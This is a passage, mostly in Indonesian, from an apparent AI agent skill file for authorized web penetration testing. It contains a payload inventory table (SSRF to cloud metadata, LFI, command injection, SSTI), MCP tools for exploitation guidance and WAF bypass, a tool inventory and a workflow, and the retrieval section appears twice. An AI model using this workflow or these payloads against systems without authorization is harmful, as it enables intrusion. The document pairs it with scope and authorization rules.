| `ssrf` | 125 | — | internal, cloud_metadata (AWS/GCP/Azure/DO/K8s), protocols, bypass |
| `xxe` | 36 | ~116 | file_read, ssrf_via_xxe, blind_oob, dos, svg_xxe, soap_xxe |
| `lfi` | 87 | ~21,893 | linux, windows |
| `cmdi` | 83 | ~9,303 | unix, windows |
| `ssti` | 40 | ~89 | detection (Jinja2, Twig, Freemarker, Mako, Pebble, Handlebars, Smarty, Velocity, ERB, Jade) |
| `ssi` | 30 | ~75 | all |
| `ldap` | 24 | ~26 | all |
| `crlf` | 13 | — | all |
| `open_redirect` | 40 | — | all |

---

## Batasan & Pengecualian

- Skill ini fokus pada **Web Application** penetration testing
- Tidak mencakup: binary exploitation, reverse engineering, malware analysis, physical security
- Untuk testing infrastruktur (Active Directory, cloud), rekomendasikan tools/skill lain
- Jika menemukan vulnerability yang di luar scope RoE, **STOP** dan lapor ke user
- Rate limiting: selalu gunakan `--rate-limit` atau delay saat testing target production
- Jika diminta melakukan sesuatu yang illegal atau di luar scope, **TOLAK** dan jelaskan alasannya

---

## 🧠 Cyber RAG Knowledge Base Integration

Skill ini dilengkapi dengan **Cyber RAG** — sistem Retrieval-Augmented Generation yang berisi **45+ dokumen cybersecurity** termasuk:
- OWASP Testing Guide v4, OWASP Top 10, OWASP ASVS
- Web Security Testing Guide (WSTG) v4.1
- Web Application Hacker's Handbook
- Red Team Field Manual (RTFM)
- CISSP, CIS Controls, Penetration Testing guides
- Malware Analysis, Network Forensics, Cloud Security (AWS, Azure)
- Dan masih banyak lagi

**Backend**: MiMo v2.5 Pro (Xiaomi) + LanceDB vector database + Ollama embeddings

### Kapan Menggunakan Cyber RAG

**GUNAKAN** Cyber RAG tools (via MCP server `cyber_rag`) untuk:
1. **Pertanyaan teknis mendalam** — "Bagaimana cara kerja SSRF via DNS rebinding?", "Apa perbedaan Reflected vs Stored XSS?"
2. **Analisis hasil scan** — setelah menjalankan nmap, nuclei, atau tools lain
3. **Rekomendasi next step** — ketika di fase tertentu dan perlu keputusan
4. **Panduan exploitation** — payload yang tepat, teknik WAF bypass
5. **CVSS scoring** — assessment severity yang akurat
6. **Verifikasi metodologi** — memastikan langkah sesuai OWASP WSTG

### MCP Tools yang Tersedia

| Tool | Fungsi | Kapan Digunakan |
|------|--------|-----------------|
| `cyber_rag_query` | Query knowledge base cybersecurity | Pertanyaan teknis, CVE analysis, best practices |
| `analyze_recon_output` | Analisis output recon tools | Setelah menjalankan nmap, subfinder, whatweb, httpx |
| `analyze_vuln_scan` | Analisis vulnerability scanner output | Setelah menjalankan nuclei, nikto, wpscan, dalfox |
| `pentest_recommend` | Rekomendasi next step pentest | Setiap kali selesai satu fase atau butuh keputusan |
| `exploit_guidance` | Panduan exploitation + WAF bypass | Saat Fase 4 — crafting payload untuk vuln tertentu |
| `cvss_scoring` | CVSS v3.1 assessment | Saat Fase 5 — scoring vulnerability untuk report |

### Contoh Penggunaan

#### Query Knowledge Base
```
Tool: cyber_rag_query
Input: {"question": "Apa teknik bypass WAF Cloudflare untuk XSS?"}
```

#### Analisis Hasil Recon
```
Tool: analyze_recon_output
Input: {
  "scan_output": "<paste nmap output here>",
  "tool_name": "nmap"
}
```

#### Rekomendasi Next Step
```
Tool: pentest_recommend
Input: {
  "current_phase": "recon",
  "findings_summary": "Ditemukan 15 subdomain, 3 diantaranya punya port 80/443 terbuka. Teknologi: Apache 2.4, PHP 7.4, WordPress 5.9",
  "target": "example.com"
}
```

#### Panduan Exploitation
```
Tool: exploit_guidance
Input: {
  "vuln_type": "sqli",
  "endpoint": "https://example.com/search?q=",
  "waf_detected": true
}
```

#### CVSS Scoring
```
Tool: cvss_scoring
Input: {
  "vuln_description": "Reflected XSS ditemukan di parameter 'search' pada /search endpoint. Payload <script>alert(1)</script> ter-execute di browser. Tidak ada WAF, tidak ada CSP header."
}
```

### Script Analisis Batch

Untuk analisis file output yang besar, gunakan script `analyze_pentest.py`:

```bash
# Analisis recon JSON
python /home/ardnord/Documents/Cyber_RAG_LLM/src/analyze_pentest.py \
  --input /home/ardnord/Skills/Pentest/recon_results/recon_*.json \
  --phase recon --output-format markdown

# Analisis nuclei JSONL
python /home/ardnord/Documents/Cyber_RAG_LLM/src/analyze_pentest.py \
  --input nuclei_results.jsonl --tool nuclei --phase scanning

# Parse only (tanpa RAG — untuk debugging)
python /home/ardnord/Documents/Cyber_RAG_LLM/src/analyze_pentest.py \
  --input nmap_results.txt --tool nmap --parse-only

# Dengan pertanyaan spesifik
python /home/ardnord/Documents/Cyber_RAG_LLM/src/analyze_pentest.py \
  --input recon_output.json --phase recon \
  --query "Subdomain mana yang paling menarik untuk di-scan?"
```

### Setup MCP Server

MCP server Cyber RAG harus sudah berjalan agar tools di atas bisa digunakan:

```bash
# Start MCP server
cd /home/ardnord/Documents/Cyber_RAG_LLM && ./start_mcp.sh

# Atau manual
cd /home/ardnord/Documents/Cyber_RAG_LLM && source venv/bin/activate && python -m src.mcp_server
```

MCP server berjalan di `http://127.0.0.1:8642/sse` dan sudah ter-register di Hermes config.

### Workflow Integrasi — Pentest + RAG

```
PENTEST WORKFLOW DENGAN CYBER RAG:

1. PLANNING
   └── cyber_rag_query: "Apa metodologi OWASP WSTG untuk [target type]?"
   └── pentest_recommend: {phase: "planning", findings: "Target: X, Type: blackbox"}

2. RECON
   └── Jalankan: recon_automation.py / nmap / subfinder
   └── analyze_recon_output: parse & analisis hasil
   └── pentest_recommend: {phase: "recon", findings: "Found X subdomains, Y ports"}

3. SCANNING
   └── Jalankan: nuclei / nikto / ffuf / arjun
   └── analyze_vuln_scan: parse & analisis findings
   └── cyber_rag_query: "Apakah [finding] ini false positive?"

4. EXPLOITATION
   └── exploit_guidance: {vuln_type: "xss", endpoint: "...", waf: true}
   └── cyber_rag_query: "Cara bypass WAF [type] untuk [vuln]?"
   └── Jalankan: dalfox / sqlmap / manual testing

5. REPORTING
   └── cvss_scoring: assessment per vulnerability
   └── pentest_recommend: {phase: "reporting", findings: "Total: X vulns"}
   └── Gunakan: poc_report_generator.py
```

---

## 🔧 Tools Configuration

### Configuration Files

| File | Path | Description |
|------|------|-------------|
| **Tools Config** | `tools_config.yaml` | Complete tools inventory with paths, versions, and commands |
| **Verification Script** | `scripts/verify_tools.py` | Verify all tools are properly installed |
| **Setup Script** | `~/.hermes/pentest_setup.sh` | Environment setup (source this in new sessions) |
| **Quick Reference** | `~/.hermes/pentest_quickref.md` | Quick command reference guide |

### Quick Setup

```bash
# Source environment (required in new terminal sessions)
source ~/.hermes/pentest_setup.sh

# Verify all tools
python3 ~/Skills/Pentest/scripts/verify_tools.py

# View quick reference
cat ~/.hermes/pentest_quickref.md
```

### Tools Summary (Verified 2026-07-14)

| Phase | Tools | Status |
|-------|-------|--------|
| **Reconnaissance** | 36 tools | 🟡 92% (sublist3r, certspotter, gitdorker missing) |
| **Scanning** | 18 tools | 🟡 94% (linkfinder missing) |
| **Exploitation** | 25 tools | 🟡 76% (ssrfmap, crlfsuite, nosqlmap, corsy, gitleaks, trufflehog missing) |
| **Post-Exploitation** | 9 tools | ✅ 100% |
| **Reporting** | 3 tools | 🟡 67% (dradis missing) |
| **Automation** | 6 tools | ❌ 0% (reconftw, osmedeus, interlace, pocsuite3, xray, afrog missing) |
| **Configurations** | 5 items | ✅ 100% |

**Total: 85/102 tools configured**

### Environment Variables

```bash
# Go environment (required for Go-based tools)
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin

# Workspace
export PENTEST_WORKSPACE=~/pentest
```

### Key Configurations

| Component | Path | Details |
|-----------|------|---------|
| **GF Patterns** | `~/.gf/` | 37 patterns (xss, sqli, ssrf, lfi, idor, etc.) |
| **Nuclei Templates** | `~/.local/nuclei-templates/` | 13,320 templates |
| **Nuclei Config** | `~/.config/nuclei/config.yaml` | Rate-limit 150, bulk-size 25 |
| **SecLists** | `/usr/share/seclists/` | 9 categories |
| **Wordlists** | `/usr/share/seclists/` | Common, Fuzzing, Passwords |

### Workspace Structure

```
~/pentest/
├── recon/          # Reconnaissance results
├── scanning/       # Scanning & enumeration results
├── exploitation/   # Exploitation results
├── reports/        # Final reports
├── wordlists/      # Custom wordlists
└── scripts/        # Custom scripts
```

### Tool Paths Reference

#### Go-Based Tools (~/go/bin/)
- subfinder, httpx, naabu, dalfox, katana, hakrawler
- gau, waybackurls, dnsx, ffuf, anew, qsreplace
- unfurl, gf, httprobe, subzy, findomain

#### Python Tools (/usr/bin/)
- sqlmap, commix, sstimap, wpscan, nikto
- theHarvester, paramspider, arjun, wafw00f

#### System Tools (/usr/bin/)
- nmap, masscan, hydra, msfconsole, msfvenom
- burpsuite, zaproxy, wireshark, mitmproxy
- hashcat, john, sslyze, sslscan

### Notes

- **Rate Limiting**: Always use `--rate-limit` when testing production targets
- **Authorization**: Ensure written authorization before testing
- **Scope**: Stay within defined scope
- **Evidence**: Document everything with screenshots and raw responses
- **Cleanup**: Remove shells and clean up after testing

---

## 🧠 Cyber RAG Knowledge Base Integration

Skill ini dilengkapi dengan **Cyber RAG** — sistem Retrieval-Augmented Generation yang berisi **45+ dokumen cybersecurity** termasuk:
- OWASP Testing Guide v4, OWASP Top 10, OWASP ASVS
- Web Security Testing Guide (WSTG) v4.1
- Web Application Hacker's Handbook
- Red Team Field Manual (RTFM)
- CISSP, CIS Controls, Penetration Testing guides
- Malware Analysis, Network Forensics, Cloud Security (AWS, Azure)
- Dan masih banyak lagi

**Backend**: MiMo v2.5 Pro (Xiaomi) + LanceDB vector database + Ollama embeddings

### Kapan Menggunakan Cyber RAG

**GUNAKAN** Cyber RAG tools (via MCP server `cyber_rag`) untuk:
1. **Pertanyaan teknis mendalam** — "Bagaimana cara kerja SSRF via DNS rebinding?"
2. **Analisis hasil scan** — setelah menjalankan nmap, nuclei, atau tools lain
3. **Rekomendasi next step** — ketika di fase tertentu dan perlu keputusan
4. **Panduan exploitation** — payload yang tepat, teknik WAF bypass
5. **CVSS scoring** — assessment severity yang akurat
6. **Verifikasi metodologi** — memastikan langkah sesuai OWASP WSTG

### MCP Tools yang Tersedia

| Tool | Fungsi | Kapan Digunakan |
|------|--------|-----------------|
| `cyber_rag_query` | Query knowledge base | Pertanyaan teknis, CVE, best practices |
| `analyze_recon_output` | Analisis output recon | Setelah nmap, subfinder, whatweb, httpx |
| `analyze_vuln_scan` | Analisis vuln scanner | Setelah nuclei, nikto, wpscan, dalfox |
| `pentest_recommend` | Rekomendasi next step | Setiap selesai satu fase |
| `exploit_guidance` | Panduan exploitation | Saat crafting payload |
| `cvss_scoring` | CVSS v3.1 assessment | Saat scoring vulnerability |

### Setup MCP Server

```bash
# Start MCP server
cd ~/Documents/Cyber_RAG_LLM && ./start_mcp.sh

# Atau gunakan script integrasi
~/Skills/Pentest/scripts/start_cyber_rag.sh
```

### Script Analisis Batch

```bash
# Analisis recon JSON
python ~/Documents/Cyber_RAG_LLM/src/analyze_pentest.py \
  --input recon_results.json --phase recon

# Analisis nuclei JSONL
python ~/Documents/Cyber_RAG_LLM/src/analyze_pentest.py \
  --input nuclei_results.jsonl --tool nuclei --phase scanning

# Dengan pertanyaan spesifik
python ~/Documents/Cyber_RAG_LLM/src/analyze_pentest.py \
  --input recon_output.json --phase recon \
  --query "Subdomain mana yang paling menarik?"
```

### Workflow Integrasi

```
1. PLANNING
   └── cyber_rag_query: "Metodologi OWASP WSTG untuk target?"
   └── pentest_recommend: {phase: "planning", findings: "..."}

2. RECON
   └── Jalankan: recon_automation.py / nmap / subfinder
   └── analyze_recon_output: parse & analisis
   └── pentest_recommend: {phase: "recon", findings: "..."}

3. SCANNING
   └── Jalankan: nuclei / nikto / ffuf
   └── analyze_vuln_scan: parse & analisis
   └── cyber_rag_query: "Apakah finding ini false positive?"

4. EXPLOITATION
   └── exploit_guidance: {vuln_type: "xss", waf: true}
   └── cyber_rag_query: "Cara bypass WAF?"
   └── Jalankan: dalfox / sqlmap

5. REPORTING
   └── cvss_scoring: assessment per vulnerability
   └── poc_report_generator.py
```
